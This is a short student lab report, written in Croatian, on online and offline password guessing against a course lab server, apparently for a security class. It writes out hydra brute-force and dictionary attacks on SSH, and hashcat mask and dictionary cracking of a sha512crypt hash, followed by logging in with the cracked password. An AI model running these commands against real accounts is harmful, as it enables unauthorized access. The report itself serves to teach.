# Lab. vježbe 5 - Online and Offline Password Guessing

# Uvod

Cilj ove vježbe bilo je demonstrirati načine provedbe online i offline password napada, usporediti ih i procijeniti vrijeme trajanja napada. 

# Postavljanje

## Online guessing attack

Kako bismo mogli obaviti zadatke današnje vježbe, prethodno je bilo potrebno instalirati nekoliko servisa: nmap (”Network Mapper”, open source alat za istraživanje mreže i sigurnosni auditing), Hydra i Hashcat (probijači šifri brute-force napadima).

```bash
sudo apt-get update
sudo apt-get install nmap

# Test it
nmap
```

Nakon provjere da možemo pristupiti serveru, pokušamo se spojiti na vlastiti Docker container:

```bash
ssh tomic_ivan@10.0.15.14
```

Zatim, poznavajući format lozinke (samo mala slova, duljine 4 - 6 karaktera), procjenjujemo pomoću *hydre* vrijeme izvršavanja naredbe:

```bash
hydra -l tomic_ivan -x 4:6:a 10.0.15.14 -V -t 1 ssh
```

Budući da je potrebno vrijeme predugo, koristit ćemo *dictionary,* također dostupan na serveru i zatim pokušati ponovno:

```bash
hydra -l tomic_ivan -P dictionary/g5/dictionary_online.txt 10.0.15.1 -V -t 4 ssh
```

Vrlo brzo (relativno na prethodni pokušaj, i ovisno o malo sreće) dobit ćemo traženu lozinku. 

## Offline guessing attack

Koristeći *hashcat* i sačuvanu šifru iz prethodnog zadatka (spremljenu u datoteku), a znajući da je lozinka sastavljena samo od malih slova i duljine točno 6 karaktera, upisujemo sljedeću naredbu:

```bash
hashcat --force -m 1800 -a 3 hash.txt ?l?l?l?l?l?l --status --status-timer 10
```

Kako bismo mogli ubrzati napad, ponovno ćemo koristiti dictionary dostupan na serveru, ovaj put onaj za offline napad, čime ćemo višestruko ubrzati proces.

```bash
hashcat --force -m 1800 -a 0 hash.txt dictionary/g1/dictionary_offline.txt --status --status-timer 10
```

Konačno, provjeravamo valjanost dobivene lozinke prijavom u odabrani račun koji smo željeli probiti preko ssh konekcije:

```bash
ssh jean_doe@10.0.15.14
```